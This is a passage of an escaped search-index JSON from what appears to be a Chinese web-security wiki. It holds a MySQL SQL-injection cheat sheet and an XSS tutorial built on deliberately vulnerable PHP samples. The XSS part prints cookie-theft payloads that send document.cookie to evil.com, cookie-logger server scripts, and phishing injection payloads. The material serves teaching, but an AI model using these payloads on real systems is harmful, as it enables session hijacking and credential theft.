            "title": "\u6ce8\u5165\u8bed\u53e5\u5907\u5fd8"
        }, 
        {
            "location": "/web/sqli/#_10", 
            "text": "SELECT   database ();  SELECT   schema_name   FROM   information_schema . schemata ;", 
            "title": "\u6570\u636e\u5e93\u540d"
        }, 
        {
            "location": "/web/sqli/#_11", 
            "text": "union \u67e5\u8be2  --MySQL 4\u7248\u672c\u65f6\u7528version=9\uff0cMySQL 5\u7248\u672c\u65f6\u7528version=10  UNION   SELECT   GROUP_CONCAT ( table_name )   FROM   information_schema . tables   WHERE   version = 10 ;     /* \u5217\u51fa\u5f53\u524d\u6570\u636e\u5e93\u4e2d\u7684\u8868 */  UNION   SELECT   TABLE_NAME   FROM   information_schema . tables   WHERE   TABLE_SCHEMA = database ();     /* \u5217\u51fa\u6240\u6709\u7528\u6237\u81ea\u5b9a\u4e49\u6570\u636e\u5e93\u4e2d\u7684\u8868 */  SELECT   table_schema ,   table_name   FROM   information_schema . tables   WHERE   table_schema != information_schema   AND   table_schema != mysql ;     \u76f2\u6ce8  AND   SELECT   SUBSTR ( table_name , 1 , 1 )   FROM   information_schema . tables     A     \u62a5\u9519  AND ( SELECT   COUNT ( * )   FROM   ( SELECT   1   UNION   SELECT   null   UNION   SELECT   ! 1 ) x   GROUP   BY   CONCAT (( SELECT   table_name   FROM   information_schema . tables   LIMIT   1 ), FLOOR ( RAND ( 0 ) * 2 )))   ( @ : = 1 ) ||@   GROUP   BY   CONCAT (( SELECT   table_name   FROM   information_schema . tables   LIMIT   1 ), !@ )   HAVING   @|| MIN ( @ : = 0 );   AND   ExtractValue ( 1 ,   CONCAT ( 0 x5c ,   ( SELECT   table_name   FROM   information_schema . tables   LIMIT   1 )));  -- \u57285.1.5\u7248\u672c\u4e2d\u6210\u529f\u3002", 
            "title": "\u8868\u540d"
        }, 
        {
            "location": "/web/sqli/#_12", 
            "text": "union \u67e5\u8be2  UNION   SELECT   GROUP_CONCAT ( column_name )   FROM   information_schema . columns   WHERE   table_name   =   tablename     \u76f2\u6ce8  AND   SELECT   SUBSTR ( column_name , 1 , 1 )   FROM   information_schema . columns     A     \u62a5\u9519  -- \u57285.1.5\u7248\u672c\u4e2d\u6210\u529f  AND   ( 1 , 2 , 3 )   =   ( SELECT   *   FROM   SOME_EXISTING_TABLE   UNION   SELECT   1 , 2 , 3   LIMIT   1 )  -- MySQL 5.1\u7248\u672c\u4fee\u590d\u4e86  AND ( SELECT   COUNT ( * )   FROM   ( SELECT   1   UNION   SELECT   null   UNION   SELECT   ! 1 ) x   GROUP   BY   CONCAT (( SELECT   column_name   FROM   information_schema . columns   LIMIT   1 ), FLOOR ( RAND ( 0 ) * 2 )))   ( @ : = 1 ) ||@   GROUP   BY   CONCAT (( SELECT   column_name   FROM   information_schema . columns   LIMIT   1 ), !@ )   HAVING   @|| MIN ( @ : = 0 );   AND   ExtractValue ( 1 ,   CONCAT ( 0 x5c ,   ( SELECT   column_name   FROM   information_schema . columns   LIMIT   1 )));     \u5229\u7528  PROCEDURE ANALYSE()  -- \u8fd9\u4e2a\u9700\u8981 web \u5c55\u793a\u9875\u9762\u6709\u4f60\u6240\u6ce8\u5165\u67e5\u8be2\u7684\u4e00\u4e2a\u5b57\u6bb5  -- \u83b7\u5f97\u7b2c\u4e00\u4e2a\u6bb5\u540d  SELECT   username ,   permission   FROM   Users   WHERE   id   =   1 ;   1   PROCEDURE   ANALYSE ()  -- \u83b7\u5f97\u7b2c\u4e8c\u4e2a\u6bb5\u540d  1   LIMIT   1 , 1   PROCEDURE   ANALYSE ()  -- \u83b7\u5f97\u7b2c\u4e09\u4e2a\u6bb5\u540d  1   LIMIT   2 , 1   PROCEDURE   ANALYSE ()", 
            "title": "\u5217\u540d"
        }, 
        {
            "location": "/web/sqli/#_13", 
            "text": "-- \u67e5\u8be2\u5b57\u6bb5\u540d\u4e3a username \u7684\u8868  SELECT   table_name   FROM   information_schema . columns   WHERE   column_name   =   username ;  -- \u67e5\u8be2\u5b57\u6bb5\u540d\u4e2d\u5305\u542b username \u7684\u8868  SELECT   table_name   FROM   information_schema . columns   WHERE   column_name   LIKE   %user% ;", 
            "title": "\u6839\u636e\u5217\u540d\u67e5\u8be2\u6240\u5728\u7684\u8868"
        }, 
        {
            "location": "/web/sqli/#_14", 
            "text": "-- hex \u7f16\u7801  SELECT   *   FROM   Users   WHERE   username   =   0 x61646D696E  -- char() \u51fd\u6570  SELECT   *   FROM   Users   WHERE   username   =   CHAR ( 97 ,   100 ,   109 ,   105 ,   110 )", 
            "title": "\u7ed5\u8fc7\u5f15\u53f7\u9650\u5236"
        }, 
        {
            "location": "/web/sqli/#_15", 
            "text": "SELECT   a   d   mi   n ;  SELECT   CONCAT ( a ,   d ,   m ,   i ,   n );  SELECT   CONCAT_WS ( ,   a ,   d ,   m ,   i ,   n );  SELECT   GROUP_CONCAT ( a ,   d ,   m ,   i ,   n );   \u4f7f\u7528  CONCAT()  \u65f6\uff0c\u4efb\u4f55\u4e2a\u53c2\u6570\u4e3a null\uff0c\u5c06\u8fd4\u56de null\uff0c\u63a8\u8350\u4f7f\u7528  CONCAT_WS() \u3002 CONCAT_WS() \u51fd\u6570\u7b2c\u4e00\u4e2a\u53c2\u6570\u8868\u793a\u7528\u54ea\u4e2a\u5b57\u7b26\u95f4\u9694\u6240\u67e5\u8be2\u7684\u7ed3\u679c\u3002", 
            "title": "\u7ed5\u8fc7\u5b57\u7b26\u4e32\u9ed1\u540d\u5355"
        }, 
        {
            "location": "/web/sqli/#_16", 
            "text": "CASE ,  IF() ,  IFNULL() ,  NULLIF() .  SELECT   IF ( 1 = 1 ,   true ,   false );  SELECT   CASE   WHEN   1 = 1   THEN   true   ELSE   false   END ;", 
            "title": "\u6761\u4ef6\u8bed\u53e5"
        }, 
        {
            "location": "/web/sqli/#_17", 
            "text": "SLEEP() ,  BENCHMARK() .   - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1( true )), false)) -", 
            "title": "\u5ef6\u65f6\u51fd\u6570"
        }, 
        {
            "location": "/web/sqli/#order-by", 
            "text": "order by  \u7531\u4e8e\u662f\u6392\u5e8f\u8bed\u53e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u5229\u7528\u6761\u4ef6\u8bed\u53e5\u505a\u5224\u65ad\uff0c\u6839\u636e\u8fd4\u56de\u7684\u6392\u5e8f\u7ed3\u679c\u4e0d\u540c\u5224\u65ad\u6761\u4ef6\u7684\u771f\u5047\u3002\u4e00\u822c\u5e26\u6709  order  \u6216\u8005  order by  \u7684\u53d8\u91cf\u5f88\u53ef\u80fd\u662f\u8fd9\u79cd\u6ce8\u5165\uff0c\u5728\u77e5\u9053\u4e00\u4e2a\u5b57\u6bb5\u7684\u65f6\u5019\u53ef\u4ee5\u91c7\u7528\u5982\u4e0b\u65b9\u5f0f\u6ce8\u5165\uff1a  \u539f\u59cb\u94fe\u63a5\uff1a http://www.test.com/list.php?order=vote  \u6839\u636e  vote  \u5b57\u6bb5\u6392\u5e8f\u3002\u627e\u5230\u6295\u7968\u6570\u6700\u5927\u7684\u7968\u6570  num  \u7136\u540e\u6784\u9020\u4ee5\u4e0b\u94fe\u63a5\uff1a  http://www.test.com/list.php?order=abs(vote-(length(user()) 0)*num)+asc  \u770b\u6392\u5e8f\u662f\u5426\u53d8\u5316\u3002\u8fd8\u6709\u4e00\u79cd\u65b9\u6cd5\u4e0d\u9700\u8981\u77e5\u9053\u4efb\u4f55\u5b57\u6bb5\u4fe1\u606f\uff0c\u4f7f\u7528  rand  \u51fd\u6570\uff1a  http://www.test.com/list.php?order=rand(true)\nhttp://www.test.com/list.php?order=rand(false)  \u4ee5\u4e0a\u4e24\u4e2a\u4f1a\u8fd4\u56de\u4e0d\u540c\u7684\u6392\u5e8f\uff0c\u5224\u65ad\u8868\u540d\u4e2d\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u5426\u5c0f\u4e8e 128 \u7684\u8bed\u53e5\u5982\u4e0b\uff1a  http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1) =128))", 
            "title": "order by \u540e\u7684\u6ce8\u5165"
        }, 
        {
            "location": "/web/sqli/#_18", 
            "text": "\u56fd\u5185\u6700\u5e38\u4f7f\u7528\u7684 GBK \u7f16\u7801\uff0c\u8fd9\u79cd\u65b9\u5f0f\u4e3b\u8981\u662f\u7ed5\u8fc7  addslashes  \u7b49\u5bf9\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u8f6c\u79fb\u7684\u7ed5\u8fc7\u3002\u53cd\u659c\u6760  \\  \u7684\u5341\u516d\u8fdb\u5236\u4e3a  %5c \uff0c\u5728\u4f60\u8f93\u5165  %bf%27  \u65f6\uff0c\u51fd\u6570\u9047\u5230\u5355\u5f15\u53f7\u81ea\u52a8\u8f6c\u79fb\u52a0\u5165  \\ \uff0c\u6b64\u65f6\u53d8\u4e3a  %bf%5c%27 \uff0c %bf%5c \n\u5728 GBK \u4e2d\u53d8\u4e3a\u4e00\u4e2a\u5bbd\u5b57\u7b26\u300c\u7e17\u300d\u3002 %bf  \u90a3\u4e2a\u4f4d\u7f6e\u53ef\u4ee5\u662f  %81-%fe  \u4e2d\u95f4\u7684\u4efb\u4f55\u5b57\u7b26\u3002\u4e0d\u6b62\u5728 SQL \u6ce8\u5165\u4e2d\uff0c\u5bbd\u5b57\u7b26\u6ce8\u5165\u5728\u5f88\u591a\u5730\u65b9\u90fd\u53ef\u4ee5\u5e94\u7528\u3002", 
            "title": "\u5bbd\u5b57\u8282\u6ce8\u5165"
        }, 
        {
            "location": "/web/sqli/#_19", 
            "text": "SQL \u6ce8\u5165\u901f\u67e5\u8868  MySQL \u6ce8\u5165\u6280\u5de7  MySQL \u6ce8\u5165\u79d1\u666e  MySQL \u6ce8\u5165\u603b\u7ed3  \u300aSQL \u6ce8\u5165\u653b\u51fb\u4e0e\u9632\u5fa1\u300b", 
            "title": "\u53c2\u8003\u8d44\u6599"
        }, 
        {
            "location": "/web/xss/", 
            "text": "XSS \u7b80\u4ecb\n\n\n\u8de8\u7ad9\u811a\u672c\uff08Cross-Site Scripting\uff0cXSS\uff09\u662f\u4e00\u79cd\u7ecf\u5e38\u51fa\u73b0\u5728 WEB \u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u8ba1\u7b97\u673a\u5b89\u5168\u6f0f\u6d1e\uff0c\u662f\u7531\u4e8e WEB \u5e94\u7528\u7a0b\u5e8f\u5bf9\u7528\u6237\u7684\u8f93\u5165\u8fc7\u6ee4\u4e0d\u8db3\u800c\u4ea7\u751f\u7684\u3002\u653b\u51fb\u8005\u5229\u7528\u7f51\u7ad9\u6f0f\u6d1e\u628a\u6076\u610f\u7684\u811a\u672c\u4ee3\u7801\u6ce8\u5165\u5230\u7f51\u9875\u4e2d\uff0c\u5f53\u5176\u4ed6\u7528\u6237\u6d4f\u89c8\u8fd9\u4e9b\u7f51\u9875\u65f6\uff0c\u5c31\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u6076\u610f\u4ee3\u7801\uff0c\u5bf9\u53d7\u5bb3\u7528\u6237\u53ef\u80fd\u91c7\u53d6 Cookies \u8d44\u6599\u7a83\u53d6\u3001\u4f1a\u8bdd\u52ab\u6301\u3001\u9493\u9c7c\u6b3a\u9a97\u7b49\u5404\u79cd\u653b\u51fb\u3002\n\n\n\u53cd\u5c04\u578b XSS\n\n\n\u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\uff08Reflected Cross-Site Scripting\uff09\u662f\u6700\u5e38\u89c1\uff0c\u4e5f\u662f\u4f7f\u7528\u6700\u5e7f\u7684\u4e00\u79cd\uff0c\u53ef\u5c06\u6076\u610f\u811a\u672c\u9644\u52a0\u5230 URL \u5730\u5740\u7684\u53c2\u6570\u4e2d\u3002\n\n\n\u53cd\u5c04\u578b XSS \u7684\u5229\u7528\u4e00\u822c\u662f\u653b\u51fb\u8005\u901a\u8fc7\u7279\u5b9a\u624b\u6cd5\uff08\u5982\u7535\u5b50\u90ae\u4ef6\uff09\uff0c\u8bf1\u4f7f\u7528\u6237\u53bb\u8bbf\u95ee\u4e00\u4e2a\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684 URL\uff0c\u5f53\u53d7\u5bb3\u8005\u70b9\u51fb\u8fd9\u4e9b\u4e13\u95e8\u8bbe\u8ba1\u7684\u94fe\u63a5\u7684\u65f6\u5019\uff0c\u6076\u610f\u4ee3\u7801\u4f1a\u76f4\u63a5\u5728\u53d7\u5bb3\u8005\u4e3b\u673a\u4e0a\u7684\u6d4f\u89c8\u5668\u6267\u884c\u3002\u6b64\u7c7b XSS \u901a\u5e38\u51fa\u73b0\u5728\u7f51\u7ad9\u7684\u641c\u7d22\u680f\u3001\u7528\u6237\u767b\u5f55\u53e3\u7b49\u5730\u65b9\uff0c\u5e38\u7528\u6765\u7a83\u53d6\u5ba2\u6237\u7aef Cookies \u6216\u8fdb\u884c\u9493\u9c7c\u6b3a\u9a97\u3002\n\n\n\u670d\u52a1\u5668\u7aef\u4ee3\u7801\uff1a\n\n\n?php\n \n\n// Is there any input? \n\n\nif\n(\n \narray_key_exists\n(\n \nname\n,\n \n$_GET\n \n)\n \n \n$_GET\n[\n \nname\n \n]\n \n!=\n \nNULL\n \n)\n \n{\n \n    \n// Feedback for end user \n\n    \necho\n \npre\nHello \n \n.\n \n$_GET\n[\n \nname\n \n]\n \n.\n \n/pre\n;\n \n\n}\n \n\n?\n\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\uff0c\u4ee3\u7801\u76f4\u63a5\u5f15\u7528\u4e86 \nname\n \u53c2\u6570\uff0c\u5e76\u6ca1\u6709\u505a\u4efb\u4f55\u7684\u8fc7\u6ee4\u548c\u68c0\u67e5\uff0c\u5b58\u5728\u660e\u663e\u7684 XSS \u6f0f\u6d1e\u3002\n\n\n\u6301\u4e45\u578b XSS\n\n\n\u6301\u4e45\u578b\u8de8\u7ad9\u811a\u672c\uff08Persistent Cross-Site Scripting\uff09\u4e5f\u7b49\u540c\u4e8e\u5b58\u50a8\u578b\u8de8\u7ad9\u811a\u672c\uff08Stored Cross-Site Scripting\uff09\u3002\n\n\n\u6b64\u7c7b XSS \u4e0d\u9700\u8981\u7528\u6237\u5355\u51fb\u7279\u5b9a URL \u5c31\u80fd\u6267\u884c\u8de8\u7ad9\u811a\u672c\uff0c\u653b\u51fb\u8005\u4e8b\u5148\u5c06\u6076\u610f\u4ee3\u7801\u4e0a\u4f20\u6216\u50a8\u5b58\u5230\u6f0f\u6d1e\u670d\u52a1\u5668\u4e2d\uff0c\u53ea\u8981\u53d7\u5bb3\u8005\u6d4f\u89c8\u5305\u542b\u6b64\u6076\u610f\u4ee3\u7801\u7684\u9875\u9762\u5c31\u4f1a\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002\u6301\u4e45\u578b XSS \u4e00\u822c\u51fa\u73b0\u5728\u7f51\u7ad9\u7559\u8a00\u3001\u8bc4\u8bba\u3001\u535a\u5ba2\u65e5\u5fd7\u7b49\u4ea4\u4e92\u5904\uff0c\u6076\u610f\u811a\u672c\u5b58\u50a8\u5230\u5ba2\u6237\u7aef\u6216\u8005\u670d\u52a1\u7aef\u7684\u6570\u636e\u5e93\u4e2d\u3002\n\n\n\u670d\u52a1\u5668\u7aef\u4ee3\u7801\uff1a\n\n\n?php\n\n  \nif\n(\n \nisset\n(\n \n$_POST\n[\n \nbtnSign\n \n]\n \n)\n \n)\n \n{\n\n    \n// Get input\n\n    \n$message\n \n=\n \ntrim\n(\n \n$_POST\n[\n \nmtxMessage\n \n]\n \n);\n\n    \n$name\n    \n=\n \ntrim\n(\n \n$_POST\n[\n \ntxtName\n \n]\n \n);\n\n    \n// Sanitize message input\n\n    \n$message\n \n=\n \nstripslashes\n(\n \n$message\n \n);\n\n    \n$message\n \n=\n \nmysql_real_escape_string\n(\n \n$message\n \n);\n\n    \n// Sanitize name input\n\n    \n$name\n \n=\n \nmysql_real_escape_string\n(\n \n$name\n \n);\n\n    \n// Update database\n\n    \n$query\n  \n=\n \nINSERT INTO guestbook ( comment, name ) VALUES ( \n$message\n, \n$name\n );\n;\n\n    \n$result\n \n=\n \nmysql_query\n(\n \n$query\n \n)\n \nor\n \ndie\n(\n \npre\n \n.\n \nmysql_error\n()\n \n.\n \n/pre\n \n);\n\n    \n//mysql_close(); }\n\n\n?\n\n\n\n\n\n\u4ee3\u7801\u53ea\u5bf9\u4e00\u4e9b\u7a7a\u767d\u7b26\u3001\u7279\u6b8a\u7b26\u53f7\u3001\u53cd\u659c\u6760\u8fdb\u884c\u4e86\u5220\u9664\u6216\u8f6c\u4e49\uff0c\u6ca1\u6709\u505a XSS \u7684\u8fc7\u6ee4\u548c\u68c0\u67e5\uff0c\u4e14\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u660e\u663e\u5b58\u5728\u5b58\u50a8\u578b XSS \u6f0f\u6d1e\u3002\n\n\nDOM XSS\n\n\n\u4f20\u7edf\u7684 XSS \u6f0f\u6d1e\u4e00\u822c\u51fa\u73b0\u5728\u670d\u52a1\u5668\u7aef\u4ee3\u7801\u4e2d\uff0c\u800c DOM-Based XSS \u662f\u57fa\u4e8e DOM \u6587\u6863\u5bf9\u8c61\u6a21\u578b\u7684\u4e00\u79cd\u6f0f\u6d1e\uff0c\u6240\u4ee5\uff0c\u53d7\u5ba2\u6237\u7aef\u6d4f\u89c8\u5668\u7684\u811a\u672c\u4ee3\u7801\u6240\u5f71\u54cd\u3002\u5ba2\u6237\u7aef JavaScript \u53ef\u4ee5\u8bbf\u95ee\u6d4f\u89c8\u5668\u7684 DOM \u6587\u672c\u5bf9\u8c61\u6a21\u578b\uff0c\u56e0\u6b64\u80fd\u591f\u51b3\u5b9a\u7528\u4e8e\u52a0\u8f7d\u5f53\u524d\u9875\u9762\u7684 URL\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5ba2\u6237\u7aef\u7684\u811a\u672c\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7 DOM \u52a8\u6001\u5730\u68c0\u67e5\u548c\u4fee\u6539\u9875\u9762\u5185\u5bb9\uff0c\u5b83\u4e0d\u4f9d\u8d56\u4e8e\u670d\u52a1\u5668\u7aef\u7684\u6570\u636e\uff0c\u800c\u4ece\u5ba2\u6237\u7aef\u83b7\u5f97 DOM \u4e2d\u7684\u6570\u636e\uff08\u5982\u4ece URL \u4e2d\u63d0\u53d6\u6570\u636e\uff09\u5e76\u5728\u672c\u5730\u6267\u884c\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u6d4f\u89c8\u5668\u7528\u6237\u53ef\u4ee5\u64cd\u7eb5 DOM \u4e2d\u7684\u4e00\u4e9b\u5bf9\u8c61\uff0c\u4f8b\u5982 URL\u3001location \u7b49\u3002\u7528\u6237\u5728\u5ba2\u6237\u7aef\u8f93\u5165\u7684\u6570\u636e\u5982\u679c\u5305\u542b\u4e86\u6076\u610f JavaScript \u811a\u672c\uff0c\u800c\u8fd9\u4e9b\u811a\u672c\u6ca1\u6709\u7ecf\u8fc7\u9002\u5f53\u7684\u8fc7\u6ee4\u548c\u6d88\u6bd2\uff0c\u90a3\u4e48\u5e94\u7528\u7a0b\u5e8f\u5c31\u53ef\u80fd\u53d7\u5230\u57fa\u4e8e DOM \u7684 XSS \u653b\u51fb\u3002\n\n\nHTML \u4ee3\u7801\uff1a\n\n\nhtml\n\n  \nhead\n\n    \ntitle\nDOM-XSS test\n/\ntitle\n\n  \n/\nhead\n\n  \nbody\n\n    \nscript\n\n      \nvar\n \na\n=\ndocument\n.\nURL\n;\n\n      \ndocument\n.\nwrite\n(\na\n.\nsubstring\n(\na\n.\nindexOf\n(\na=\n)\n+\n2\n,\na\n.\nlength\n));\n\n    \n/\nscript\n\n  \n/\nbody\n\n\n/\nhtml\n\n\n\n\n\n\u5c06\u4ee3\u7801\u4fdd\u5b58\u5728 domXSS.html \u4e2d\uff0c\u6d4f\u89c8\u5668\u8bbf\u95ee\uff1a\n\n\nhttp://127.0.0.1/domXSS.html?a=\nscript\nalert(\nXSS\n)\n/script\n\n\n\n\n\n\u5373\u53ef\u89e6\u53d1 XSS \u6f0f\u6d1e\u3002\n\n\nXSS \u5229\u7528\u65b9\u5f0f\n\n\nCookies \u7a83\u53d6\n\n\n\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u4ee3\u7801\u83b7\u53d6\u5ba2\u6237\u7aef\u7684 Cookies \u4fe1\u606f\uff1a\n\n\nscript\n\n\ndocument\n.\nlocation\n=\nhttp://www.evil.com/cookie.asp?cookie=\n+\ndocument\n.\ncookie\n\n\nnew\n \nImage\n().\nsrc\n=\nhttp://www.evil.com/cookie.asp?cookie=\n+\ndocument\n.\ncookie\n\n\n/\nscript\n\n\nimg\n \nsrc\n=\nhttp://www.evil.com/cookie.asp?cookie=\n+\ndocument\n.\ncookie\n/\nimg\n\n\n\n\n\n\u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\uff0c\u6709\u4e00\u4e2a\u63a5\u53d7\u548c\u8bb0\u5f55 Cookies \u4fe1\u606f\u7684\u6587\u4ef6\uff0c\u793a\u4f8b\u5982\u4e0b\uff1a\n\n\n%\n  msg=Request.ServerVariables(\nQUERY_STRING\n)\n  testfile=Server.MapPath(\ncookie.txt\n)\n  set fs=server.CreateObject(\nScripting.filesystemobject\n)\n  set thisfile=fs.OpenTextFile(testfile,8,True,0)\n  thisfile.Writeline(\nmsg\n \n)\n  thisfile.close\n  set fs=nothing\n%\n\n\n\n\n\n?php\n\n\n$cookie\n \n=\n \n$_GET\n[\ncookie\n];\n\n\n$log\n \n=\n \nfopen\n(\ncookie.txt\n,\n \na\n);\n\n\nfwrite\n(\n$log\n,\n \n$cookie\n \n.\n \n\\n\n);\n\n\nfclose\n(\n$log\n);\n\n\n?\n\n\n\n\n\n\u653b\u51fb\u8005\u5728\u83b7\u53d6\u5230 Cookies \u4e4b\u540e\uff0c\u901a\u8fc7\u4fee\u6539\u672c\u673a\u6d4f\u89c8\u5668\u7684 Cookies\uff0c\u5373\u53ef\u767b\u5f55\u53d7\u5bb3\u8005\u7684\u8d26\u6237\u3002\n\n\n\u4f1a\u8bdd\u52ab\u6301\n\n\n\u7531\u4e8e\u4f7f\u7528 Cookies \u5b58\u5728\u4e00\u5b9a\u7684\u5b89\u5168\u7f3a\u9677\uff0c\u56e0\u6b64\uff0c\u5f00\u53d1\u8005\u5f00\u59cb\u4f7f\u7528\u4e00\u4e9b\u66f4\u4e3a\u5b89\u5168\u7684\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u5982 Session\u3002\u5728 Session \u673a\u5236\u4e2d\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u901a\u8fc7\u6807\u8bc6\u7b26\u6765\u8bc6\u522b\u7528\u6237\u8eab\u4efd\u548c\u7ef4\u6301\u4f1a\u8bdd\uff0c\u4f46\u8fd9\u4e2a\u6807\u8bc6\u7b26\u4e5f\u6709\u88ab\u5176\u4ed6\u4eba\u5229\u7528\u7684\u53ef\u80fd\u3002\u4f1a\u8bdd\u52ab\u6301\u7684\u672c\u8d28\u662f\u5728\u653b\u51fb\u4e2d\u5e26\u4e0a\u4e86 Cookies \u5e76\u53d1\u9001\u5230\u4e86\u670d\u52a1\u7aef\u3002\n\n\n\u5982\u67d0 CMS \u7684\u7559\u8a00\u7cfb\u7edf\u5b58\u5728\u4e00\u4e2a\u5b58\u50a8\u578b XSS \u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u628a XSS \u4ee3\u7801\u5199\u8fdb\u7559\u8a00\u4fe1\u606f\u4e2d\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u5f55\u540e\u53f0\u5e76\u67e5\u770b\u662f\uff0c\u4fbf\u4f1a\u89e6\u53d1 XSS \u6f0f\u6d1e\uff0c\u7531\u4e8e XSS \u662f\u5728\u540e\u53f0\u89e6\u53d1\u7684\uff0c\u6240\u4ee5\u653b\u51fb\u7684\u5bf9\u8c61\u662f\u7ba1\u7406\u5458\uff0c\u901a\u8fc7\u6ce8\u5165 JavaScript \u4ee3\u7801\uff0c\u653b\u51fb\u8005\u4fbf\u53ef\u4ee5\u52ab\u6301\u7ba1\u7406\u5458\u4f1a\u8bdd\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c\uff0c\u4ece\u800c\u8fbe\u5230\u63d0\u5347\u6743\u9650\u7684\u76ee\u7684\u3002\n\n\n\u6bd4\u5982\uff0c\u653b\u51fb\u8005\u60f3\u5229\u7528 XSS \u6dfb\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u53ea\u9700\u8981\u901a\u8fc7\u4e4b\u524d\u7684\u4ee3\u7801\u5ba1\u8ba1\u6216\u5176\u4ed6\u65b9\u5f0f\uff0c\u622a\u53d6\u5230\u6dfb\u52a0\u7ba1\u7406\u5458\u8d26\u53f7\u65f6\u7684 HTTP \u8bf7\u6c42\u4fe1\u606f\uff0c\u7136\u540e\u4f7f\u7528 XMLHTTP \u5bf9\u8c61\u5728\u540e\u53f0\u53d1\u9001\u4e00\u4e2a HTTP \u8bf7\u6c42\u5373\u53ef\uff0c\u7531\u4e8e\u8bf7\u6c42\u5e26\u4e0a\u4e86\u88ab\u653b\u51fb\u8005\u7684 Cookies\uff0c\u5e76\u4e00\u540c\u53d1\u9001\u5230\u670d\u52a1\u7aef\uff0c\u5373\u53ef\u5b9e\u73b0\u6dfb\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u8d26\u6237\u7684\u64cd\u4f5c\u3002\n\n\n\u9493\u9c7c\n\n\n\n\n\n\n\u91cd\u5b9a\u5411\u9493\u9c7c\n\n\n\u628a\u5f53\u524d\u9875\u9762\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u9493\u9c7c\u9875\u9762\u3002\n\n\nhttp://www.bug.com/index.php?search=\nscript\ndocument.location.href=\nhttp://www.evil.com\n/script\n\n\n\n\n\n\n\n\n\nHTML \u6ce8\u5165\u5f0f\u9493\u9c7c\n\n\n\u4f7f\u7528 XSS \u6f0f\u6d1e\u6ce8\u5165 HTML \u6216 JavaScript \u4ee3\u7801\u5230\u9875\u9762\u4e2d\u3002\n\n\nhttp://www.bug.com/index.php?search=\nhtml\nhead\ntitle\nlogin\n/title\n/head\nbody\ndiv style=\ntext-align:center;\nform Method=\nPOST\n Action=\nphishing.php\n Name=\nform\nbr /\nbr /\nLogin:\nbr/\ninput name=\nlogin\n /\nbr /\nPassword:\nbr/\ninput name=\nPassword\n type=\npassword\n /\nbr/\nbr/\ninput name=\nValid\n value=\nOk\n type=\nsubmit\n /\nbr/\n/form\n/div\n/body\n/html\n\n\n\n\n\n\n\n\n\n\u8be5\u6bb5\u4ee3\u7801\u4f1a\u5728\u6b63\u5e38\u9875\u9762\u4e2d\u5d4c\u5165\u4e00\u4e2a Form \u8868\u5355\u3002\n\n\n\n\n\n\niframe \u9493\u9c7c\n\n\n\u8fd9\u79cd\u65b9\u5f0f\u662f\u901a\u8fc7 \niframe\n \u6807\u7b7e\u5d4c\u5165\u8fdc\u7a0b\u57df\u7684\u4e00\u4e2a\u9875\u9762\u5b9e\u65bd\u9493\u9c7c\u3002\n\n\nhttp://www.bug.com/index.php?search=\niframe src=\nhttp://www.evil.com\n height=\n100%\n width=\n100%\n/iframe\n\n\n\n\n\n\n\n\n\nFlash \u9493\u9c7c\n\n\n\u5c06\u6784\u9020\u597d\u7684 Flash \u6587\u4ef6\u4f20\u5165\u670d\u52a1\u5668\uff0c\u5728\u76ee\u6807\u7f51\u7ad9\u7528 \nobject\n \u6216 \nembed\n \u6807\u7b7e\u5f15\u7528\u5373\u53ef\u3002\n\n\n\n\n\n\n\u9ad8\u7ea7\u9493\u9c7c\u6280\u672f\n\n\n\u6ce8\u5165\u4ee3\u7801\u52ab\u6301 HTML \u8868\u5355\u3001\u4f7f\u7528 JavaScript \u7f16\u5199\u952e\u76d8\u8bb0\u5f55\u5668\u7b49\u3002\n\n\n\n\n\n\n\u7f51\u9875\u6302\u9a6c\n\n\n\u4e00\u822c\u90fd\u662f\u901a\u8fc7\u7be1\u6539\u7f51\u9875\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0\u7684\uff0c\u5982\u5728 XSS \u4e2d\u4f7f\u7528 \niframe\n \u6807\u7b7e\u3002\n\n\nDOS \u4e0e DDOS\n\n\n\u6ce8\u5165\u6076\u610f JavaScript \u4ee3\u7801\uff0c\u53ef\u80fd\u4f1a\u5f15\u8d77\u4e00\u4e9b\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002\n\n\nXSS \u8815\u866b\n\n\n\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684 XSS \u4ee3\u7801\uff0c\u53ef\u4ee5\u5b9e\u73b0\u975e\u6cd5\u8f6c\u8d26\u3001\u7be1\u6539\u4fe1\u606f\u3001\u5220\u9664\u6587\u7ae0\u3001\u81ea\u6211\u590d\u5236\u7b49\u8bf8\u591a\u529f\u80fd\u3002", 
            "title": "XSS \u8de8\u7ad9\u811a\u672c\u653b\u51fb"
        }, 
        {
            "location": "/web/xss/#xss", 
